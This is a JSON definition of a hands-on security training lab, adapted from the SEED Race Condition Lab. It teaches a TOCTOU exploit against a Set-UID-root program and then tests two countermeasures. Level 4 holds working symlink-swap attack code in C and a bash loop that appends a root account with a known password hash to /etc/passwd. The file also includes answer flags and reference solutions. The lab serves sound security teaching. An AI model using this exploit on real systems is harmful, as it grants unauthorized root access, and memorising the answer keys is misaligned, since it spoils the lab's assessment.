@@ -1,0 +1,309 @@
+{
+  "title": "Race Condition Vulnerability Lab (SEED)",
+  "description": "A hands-on system security lab based on the SEED Labs \"Race Condition Vulnerability Lab\" by Wenliang Du. You will exploit a TOCTOU (time-of-check to time-of-use) race condition in a Set-UID-root program to gain root privilege, then evaluate two countermeasures.",
+  "prerequisites": [
+    "Basic Linux command line (bash, file permissions, users/groups)",
+    "Basic C programming (reading, lightly editing and compiling a C program with gcc)",
+    "Basic understanding of Set-UID programs and the access()/fopen() pair"
+  ],
+  "outcomes": [
+    "You will be able to identify a TOCTOU race-condition window in source code.",
+    "You will be able to exploit a race condition against a Set-UID-root program to escalate privilege, including the atomic-rename technique needed when a naive symlink-swap attack keeps losing the race.",
+    "You will be able to apply and evaluate two countermeasures: the Principle of Least Privilege (seteuid) and the kernel's built-in sticky-symlink protection."
+  ],
+  "state": "UNRELEASED",
+  "show_stepper_bar": true,
+  "levels": [
+    {
+      "title": "Introduction",
+      "level_type": "INFO_LEVEL",
+      "order": 0,
+      "estimated_duration": 0,
+      "minimal_possible_solve_time": null,
+      "content": "# Before you start\n\n* This training is worth **20 points** in total. Each level lists its own `max_score`.\n* Hints are optional and cost **between 0.5 and 2 points** each (shown on the hint itself) -- use them only if you are stuck.\n* **The flags for Levels 3 and 4 are unique to your own sandbox.** They are generated fresh when your sandbox is created, so an answer copied from another student, from a previous run, or from a public write-up of this lab will **not** be accepted. You must actually perform the exploit on your own machine to get your own flag.\n* If you break something (e.g. corrupt `/etc/passwd`), you have a safety net -- see \"If something goes wrong\" below. You will not lose points for using it.\n* This lab is for educational purposes only, performed against a disposable machine you were given for this exercise. Never perform these techniques against a system you do not own or do not have explicit written authorization to test.\n\n# Background\n\nA **race condition** occurs when the correctness of a program depends on the relative timing of events it does not fully control. A classic and dangerous instance is a **TOCTOU** bug (Time-Of-Check to Time-Of-Use): a privileged program first *checks* some condition (e.g. \"can the real user write this file?\"), and then, a short time later, *uses* the resource the check was about (e.g. \"open the file and write to it\"). If an attacker can change what the resource refers to in the window between the check and the use, the use no longer reflects what was checked.\n\nIn this lab you are given `vulp`, a small, seemingly harmless Set-UID-root program that appends user input to `/tmp/XYZ`, after first checking (with `access()`) that the real user is allowed to write that file. You will show that this check is not reliable, exploit the gap to make the program write into `/etc/passwd` instead, and use that to create your own root-privileged account -- all without ever having real root access, or any sudo rights at all, on this machine. Afterwards you will apply and test two real countermeasures.\n\n# If something goes wrong\n\nIf `/etc/passwd` ends up corrupted, or `/tmp/XYZ` ends up owned by `root` so you can no longer delete it, run:\n\n```\nrace-lab-reset\n```\n\nThis restores a clean backup of `/etc/passwd` and clears `/tmp/XYZ` / `/tmp/ABC`, so you can try again. (It is a small Set-UID-root helper you can run directly -- it takes no input and does exactly one fixed thing, so handing it to you doesn't open any shortcut.)\n\n# Credits\n\nThis exercise is adapted from the **SEED Labs \"Race Condition Vulnerability Lab\"**, (c) Wenliang Du, Syracuse University, free to use for non-commercial educational purposes (https://seedsecuritylabs.org). See `ATTRIBUTION.txt` in this repository."
+    },
+    {
+      "title": "Get Access",
+      "level_type": "ACCESS_LEVEL",
+      "order": 1,
+      "estimated_duration": 0,
+      "minimal_possible_solve_time": null,
+      "passkey": "start",
+      "cloud_content": "Your first task is to access the sandbox, where you will complete all the following levels. After you have successfully connected, submit the answer **`start`**.\n\n### Sandbox access\n1. In the topology overview on the right, right-click on **`seed`** and then click on **`Open GUI`**, and a new pop-up window will appear.\n2. Log in with username **`seed`** and password **`dees`**.\n\nAlternatively, you can use SSH to connect to the machine. SSH access makes it easier to copy-paste commands and flags, but requires more steps to set up. See [documentation](https://docs.platform.cyberrange.cz/user-guide-advanced/sandboxes/sandbox-access/#user-access) for more details.\n\n**Note:** the `seed` account has **no sudo rights at all** on this machine (try `sudo -l` and see). This is intentional: the only way to become root anywhere in this lab is to actually perform the Level 4 exploit. A couple of narrowly-scoped helper tools (`race-lab-reset`, `race-lab-protect-on`) are available directly, without `sudo`, for the few fixed, safe admin actions the lab legitimately needs.",
+      "local_content": "This sandbox has not been tested for use with local sandbox."
+    },
+    {
+      "title": "Inspect the vulnerable Set-UID program",
+      "level_type": "TRAINING_LEVEL",
+      "order": 2,
+      "estimated_duration": 3,
+      "minimal_possible_solve_time": null,
+      "answer": "-rwsr-xr-x",
+      "answer_variable_name": null,
+      "content": "A compiled copy of `vulp` is already waiting for you at `/home/seed/lab/vulp`, built from the source at `/home/seed/lab/vulp.c` and already set up with root ownership and the Set-UID bit (in a real engagement you would not be handed a convenient root-owned Set-UID binary -- but reproducing exactly how one gets created is not itself the interesting part of this lab).\n\nRead `vulp.c`. It appends a line of user input to `/tmp/XYZ`, but only after checking with `access()` that the real user running it is allowed to write that file:\n\n```c\nif(!access(fn, W_OK)){\n    fp = fopen(fn, \"a+\");\n    fwrite(\"\\n\", sizeof(char), 1, fp);\n    fwrite(buffer, sizeof(char), strlen(buffer), fp);\n    fclose(fp);\n}\n```\n\nRun `ls -l /home/seed/lab/vulp` and look closely at the permission bits.\n\nThe flag for this level is the exact 10-character permission string `ls -l` shows.",
+      "solution": "```\nseed@seed:~/lab$ ls -l vulp\n-rwsr-xr-x 1 root root 16728 ... vulp\n```\nThe `s` in the owner's execute position is the Set-UID bit: whoever runs this binary executes it with the *file owner's* privilege (root), not their own.",
+      "solution_penalized": false,
+      "hints": [
+        {
+          "title": "Which file?",
+          "content": "`ls -l /home/seed/lab/vulp`",
+          "hint_penalty": 0.5,
+          "order": 0
+        },
+        {
+          "title": "What does the 's' mean?",
+          "content": "A lowercase `s` where you would normally see `x` in the owner's permission triplet marks the Set-UID bit.",
+          "hint_penalty": 1,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 2,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "inspected_vulp",
+          "prereq_state": [],
+          "cmd": "ls -l /home/seed/lab/vulp",
+          "cmd_type": "bash-command",
+          "cmd_regex": "ls -l .*vulp",
+          "optional": false
+        }
+      ],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Understand the magic password -- safely",
+      "level_type": "TRAINING_LEVEL",
+      "order": 3,
+      "estimated_duration": 5,
+      "minimal_possible_solve_time": null,
+      "answer": "ab2IRo8rbkhTM",
+      "answer_variable_name": null,
+      "content": "Before touching the real exploit, understand what you are actually trying to achieve -- without touching the real `/etc/passwd` or needing any extra privilege at all.\n\nEach line of `/etc/passwd` has 7 colon-separated fields; the 3rd is the numeric user ID. A user ID of `0` means root privilege, regardless of the account's name. The 2nd field normally holds `x` (meaning: look in `/etc/shadow`), but it can instead hold a traditional DES-crypt password hash directly -- and Ubuntu live-CD images used a well-known magic hash, `U6aMy0wojraho`, for a password-less login (the 6th character is the digit zero, not the letter O).\n\nTraditional DES-crypt hashes always start with a 2-character salt, and the same (salt, password) pair always produces the same hash -- which is exactly how you can verify this locally, on your own, without any `sudo`:\n\n```\npython3 -c \"import crypt; print(crypt.crypt('', 'U6'))\"\n```\n\n1. Run the command above and confirm it prints exactly `U6aMy0wojraho` -- that is your proof the magic hash really does correspond to an *empty* password.\n2. Now compute the DES-crypt hash of the password `seedlab` with the salt `ab`, the same way.\n\nThe flag for this level is the hash your command in step 2 prints.",
+      "solution": "```\nseed@seed:~$ python3 -c \"import crypt; print(crypt.crypt('', 'U6'))\"\nU6aMy0wojraho\nseed@seed:~$ python3 -c \"import crypt; print(crypt.crypt('seedlab', 'ab'))\"\nab2IRo8rbkhTM\n```\nTraditional DES-crypt is a deterministic, non-salted-by-randomness scheme (only the 2-character salt you supply affects the output), so anyone, on any machine, gets the same hash for the same (password, salt) pair -- which is also exactly why the magic password trick works at all.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Which Python module?",
+          "content": "The standard library's `crypt` module (deprecated but still present on this image).",
+          "hint_penalty": 0.5,
+          "order": 0
+        },
+        {
+          "title": "Exact command for step 2",
+          "content": "`python3 -c \"import crypt; print(crypt.crypt('seedlab', 'ab'))\"`",
+          "hint_penalty": 1,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 3,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "verified_magic_hash",
+          "prereq_state": [],
+          "cmd": "python3 -c \"import crypt; print(crypt.crypt('', 'U6'))\"",
+          "cmd_type": "bash-command",
+          "cmd_regex": "python3 -c .*crypt.*U6.*",
+          "optional": false
+        }
+      ],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Launch the race-condition attack",
+      "level_type": "TRAINING_LEVEL",
+      "order": 4,
+      "estimated_duration": 15,
+      "minimal_possible_solve_time": null,
+      "answer": null,
+      "answer_variable_name": "flag2_secret",
+      "content": "Now do it for real, without any help from `sudo`: exploit `vulp`'s own race condition to make it append your own root-privileged account to `/etc/passwd`.\n\n**The window.** `vulp` calls `access(\"/tmp/XYZ\", W_OK)` and then, a moment later, `fopen(\"/tmp/XYZ\", \"a+\")`. If `/tmp/XYZ` is a symlink and you can change what it points to **between** those two calls, `access()` checks one file while `fopen()` (running with root's effective privilege) opens a different one.\n\n**The plan.**\n1. Prepare an input file for `vulp` containing one line you want appended to `/etc/passwd`, e.g. a new account with UID 0 and the magic password hash from Level 3 (pick your own username this time -- do not reuse `test`).\n2. Write an attack program/script that repeatedly makes `/tmp/XYZ` point at `/etc/passwd`, racing against repeated runs of `vulp < your_input_file`.\n3. Run the attack in a loop until `/etc/passwd` is modified (e.g. poll its `ls -l` timestamp/size in a `while` loop from a shell script).\n\n**If the naive approach stalls.** A plain `unlink(\"/tmp/XYZ\"); symlink(...)` has its own, separate race condition: if your process is scheduled out right after the `unlink()` but before the `symlink()`, and `vulp` runs its `fopen()` in that gap, `/tmp/XYZ` gets re-created **owned by root** -- and because `/tmp` has the sticky bit set, your unprivileged attack process can then never delete it again, so the attack can no longer succeed. If this happens, check the owner of `/tmp/XYZ` with `ls -l /tmp/XYZ`; if it is `root`, run `race-lab-reset` (no `sudo` needed -- it's a small Set-UID-root helper) and switch to the atomic technique below before trying again.\n\n**The atomic fix for your own attack.** Make two symlinks, `/tmp/XYZ` and `/tmp/ABC`, pointing at two different targets, then atomically swap what they point to with a single system call: `syscall(SYS_renameat2, 0, \"/tmp/XYZ\", 0, \"/tmp/ABC\", RENAME_EXCHANGE)`. This removes the race condition from your own attack program.\n\n**Finishing up.** Once `/etc/passwd` has been modified, `su` into the account you added, confirm `id` shows `uid=0`, then read `cat /root/proof_task2.txt`.\n\nThe flag for this level is the exact content of that file. (This flag is unique to your own sandbox.)",
+      "solution": "Naive (racy) version of the attacker's link-swap:\n```c\nunlink(\"/tmp/XYZ\");\nsymlink(\"/etc/passwd\", \"/tmp/XYZ\");\n```\nAtomic version, which avoids the attack program's own race condition:\n```c\n#include <unistd.h>\n#include <sys/syscall.h>\n#include <linux/fs.h>\n\nint main() {\n    unsigned int flags = RENAME_EXCHANGE;\n    unlink(\"/tmp/XYZ\");  symlink(\"/dev/null\", \"/tmp/XYZ\");\n    unlink(\"/tmp/ABC\");  symlink(\"/etc/passwd\", \"/tmp/ABC\");\n    syscall(SYS_renameat2, 0, \"/tmp/XYZ\", 0, \"/tmp/ABC\", flags);\n    return 0;\n}\n```\nDriving loop (run the attack in the background, then loop `vulp`):\n```bash\nCHECK_FILE=\"ls -l /etc/passwd\"\nold=$($CHECK_FILE)\nnew=$($CHECK_FILE)\nwhile [ \"$old\" == \"$new\" ]\ndo\n    ./vulp < passwd_input\n    new=$($CHECK_FILE)\ndone\necho \"STOP... passwd has been changed\"\n```\nThen: `su <your-new-user>`, `id`, `cat /root/proof_task2.txt`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "What exactly am I racing?",
+          "content": "You are racing to change what `/tmp/XYZ` points to in the gap between `vulp`'s `access()` call and its `fopen()` call -- make `/tmp/XYZ` a symlink to `/etc/passwd` right in that window.",
+          "hint_penalty": 0.5,
+          "order": 0
+        },
+        {
+          "title": "Creating the symlink",
+          "content": "`unlink(\"/tmp/XYZ\"); symlink(\"/etc/passwd\", \"/tmp/XYZ\");` (or the `ln -sf` command) -- but see the next hint if `/tmp/XYZ` keeps ending up owned by root.",
+          "hint_penalty": 1,
+          "order": 1
+        },
+        {
+          "title": "My attack program has its own race condition",
+          "content": "Use `syscall(SYS_renameat2, 0, \"/tmp/XYZ\", 0, \"/tmp/ABC\", RENAME_EXCHANGE)` to atomically swap two pre-created symlinks instead of doing a separate `unlink()` then `symlink()`.",
+          "hint_penalty": 2,
+          "order": 2
+        },
+        {
+          "title": "Driving the attack",
+          "content": "Run your attack program in the background (or in a loop), and run `./vulp < input_file` in a loop from a second shell/script until `ls -l /etc/passwd` shows it changed.",
+          "hint_penalty": 1,
+          "order": 3
+        }
+      ],
+      "incorrect_answer_limit": 15,
+      "attachments": [],
+      "max_score": 10,
+      "variant_answers": true,
+      "reference_solution": [
+        {
+          "state_name": "attack_compiled",
+          "prereq_state": [],
+          "cmd": "gcc -o attack attack.c",
+          "cmd_type": "bash-command",
+          "cmd_regex": "gcc -o attack .*\\.c",
+          "optional": false
+        },
+        {
+          "state_name": "passwd_modified",
+          "prereq_state": [
+            "attack_compiled"
+          ],
+          "cmd": "./vulp < passwd_input",
+          "cmd_type": "bash-command",
+          "cmd_regex": "\\./vulp < .*",
+          "optional": false
+        },
+        {
+          "state_name": "became_root_via_exploit",
+          "prereq_state": [
+            "passwd_modified"
+          ],
+          "cmd": "su",
+          "cmd_type": "bash-command",
+          "cmd_regex": "su .*",
+          "optional": false
+        }
+      ],
+      "mitre_techniques": [
+        "T1068"
+      ],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Countermeasure 1: apply the Principle of Least Privilege",
+      "level_type": "TRAINING_LEVEL",
+      "order": 5,
+      "estimated_duration": 6,
+      "minimal_possible_solve_time": null,
+      "answer": "no",
+      "answer_variable_name": null,
+      "content": "`vulp`'s real design flaw is not the missing atomicity by itself -- it's that the program is handed root privilege it does not actually need for most of its work. The **Principle of Least Privilege** says a program should hold a privilege only for as long as, and only as broadly as, it actually needs it.\n\nA skeleton is waiting for you at `/home/seed/lab/vulp_seteuid.c`, with the original logic unchanged and a `TODO` marking where to add a call to `seteuid(getuid())`. Read the comment in the file carefully: does this particular program ever legitimately need root privilege for the `access()`/`fopen()`/`fwrite()`/`fclose()` sequence, given that it only ever touches a file the real user already owns? Decide where (if at all) the effective privilege should be restored, and justify it.\n\n1. Edit `/home/seed/lab/vulp_seteuid.c`, filling in the `TODO`.\n2. Save it. You do not compile or `chown`/`chmod` it yourself -- a background job on this machine automatically compiles it and, if it compiles cleanly, installs the result as a Set-UID-root binary at `/home/seed/lab/vulp_fixed` within about 10 seconds. If it doesn't appear, check `/home/seed/lab/.vulp_fixed_build.log` for a compiler error.\n3. Repeat your Level 4 attack against `vulp_fixed` instead of `vulp` (you can reuse your attack program; just point it at `vulp_fixed` in your driving loop).\n\n**Note:** this background job only ever acts once you have already solved Level 4 -- it refuses to do anything until `/etc/passwd` has actually been modified by your real exploit. If you haven't completed Level 4 yet, do that first.\n\nThe flag for this level: does your race-condition attack still succeed against `vulp_fixed`? Answer **`yes`** or **`no`**.",
+      "solution": "The fix is to call `seteuid(getuid())` once, before the `access()`/`fopen()` sequence, and never restore root privilege for that sequence at all -- the program never legitimately needs it, since it only ever touches a file the real user already has rights to. With effective privilege permanently dropped for this operation, even if the attacker swaps `/tmp/XYZ` to point at `/etc/passwd`, `fopen()` now runs with the *real* user's (unprivileged) rights and fails to open `/etc/passwd`. Depending on exactly how the code handles a failed `fopen()`, the program either prints `No permission` (if `access()` itself fails first) or crashes on the unchecked NULL `FILE *` -- but in neither case does attacker-controlled data ever reach `/etc/passwd`. The answer is **no**, the attack no longer succeeds.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Where does this program actually need root?",
+          "content": "Look again at what `/tmp/XYZ` is -- a file in the real user's own writable space. Does appending to it ever genuinely require root?",
+          "hint_penalty": 0.5,
+          "order": 0
+        },
+        {
+          "title": "Which syscall drops effective privilege?",
+          "content": "`seteuid(getuid())` makes the process's effective UID equal to its real UID again, for the rest of the process (or until `seteuid()` is called again).",
+          "hint_penalty": 1,
+          "order": 1
+        },
+        {
+          "title": "Re-raising privilege before fopen()",
+          "content": "If you are tempted to call `seteuid(0)` again right before `fopen()` to \"restore\" the original behaviour, stop -- that recreates exactly the race-condition window you exploited in Level 4.",
+          "hint_penalty": 1.5,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 3,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "vulp_seteuid_edited",
+          "prereq_state": [],
+          "cmd": "nano vulp_seteuid.c",
+          "cmd_type": "bash-command",
+          "cmd_regex": "(nano|vim|vi) .*vulp_seteuid\\.c",
+          "optional": false
+        },
+        {
+          "state_name": "vulp_fixed_appeared",
+          "prereq_state": [
+            "vulp_seteuid_edited"
+          ],
+          "cmd": "ls -l vulp_fixed",
+          "cmd_type": "bash-command",
+          "cmd_regex": "ls -l .*vulp_fixed",
+          "optional": false
+        }
+      ],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Countermeasure 2: Ubuntu's built-in sticky-symlink protection",
+      "level_type": "TRAINING_LEVEL",
+      "order": 6,
+      "estimated_duration": 3,
+      "minimal_possible_solve_time": null,
+      "answer": "EACCES",
+      "answer_variable_name": null,
+      "content": "Modern Linux kernels (and Ubuntu 10.10+) ship a built-in, system-wide protection against exactly this class of attack: `fs.protected_symlinks`. It was turned **off** on this machine for Levels 2-5 so your attack could succeed. The documentation describes it as: *\"symlinks in world-writable sticky directories (e.g. `/tmp`) cannot be followed if the follower and directory owner do not match the symlink owner.\"*\n\n1. Turn the protection back **on**: `race-lab-protect-on` (no `sudo` needed -- it's a small Set-UID-root helper that does exactly one fixed thing, so handing it to you doesn't open any shortcut).\n2. Repeat your Level 4 attack against the *original* `vulp` binary (not `vulp_fixed`).\n3. Look at what the kernel does when `vulp` tries to `fopen()` the symlink this time. Running `strace -f ./vulp < passwd_input` (or simply checking `vulp`'s behaviour / `dmesg`) will show the exact error the `open()` syscall now fails with.\n\nThe flag for this level is the C `errno` name (in capital letters) of the error the kernel returns when it refuses to follow your dangling/mismatched-owner symlink.",
+      "solution": "```\nseed@seed:~/lab$ race-lab-protect-on\nrace-lab-protect-on: fs.protected_symlinks is now enabled (1).\nseed@seed:~/lab$ strace -f ./vulp < passwd_input 2>&1 | grep -i open\nopenat(AT_FDCWD, \"/tmp/XYZ\", O_RDWR|O_CREAT|O_APPEND, 0666) = -1 EACCES (Permission denied)\n```\nBecause the symlink in the sticky `/tmp` directory is owned by the unprivileged attacker but is being followed by a process whose effective owner (root) does not match, the kernel refuses to follow it and `open()`/`fopen()` fails with `EACCES`.\n\n**Limitation to note in your report:** this protection only covers *symlinks inside world-writable sticky directories* (like `/tmp`). It does nothing to stop a TOCTOU race condition expressed through hard links, directory renames, bind mounts, or any file that does not live inside such a directory -- the underlying check-then-use design flaw in `vulp` is still there.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "How do I turn the protection back on?",
+          "content": "`race-lab-protect-on`",
+          "hint_penalty": 0.5,
+          "order": 0
+        },
+        {
+          "title": "How do I see the exact error?",
+          "content": "Trace the syscalls: `strace -f ./vulp < passwd_input 2>&1 | grep -i open`",
+          "hint_penalty": 1,
+          "order": 1
+        },
+        {
+          "title": "What is the error called?",
+          "content": "It is the standard errno for a failed permission check -- the same one `open()` returns for an ordinary permission-denied error.",
+          "hint_penalty": 1.5,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 2,
+      "variant_answers": false,
+      "reference_solution": [
+        {
+          "state_name": "protection_on",
+          "prereq_state": [],
+          "cmd": "race-lab-protect-on",
+          "cmd_type": "bash-command",
+          "cmd_regex": "race-lab-protect-on",
+          "optional": false
+        }
+      ],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    }
+  ],
+  "estimated_duration": 32,
+  "variant_sandboxes": false
+}
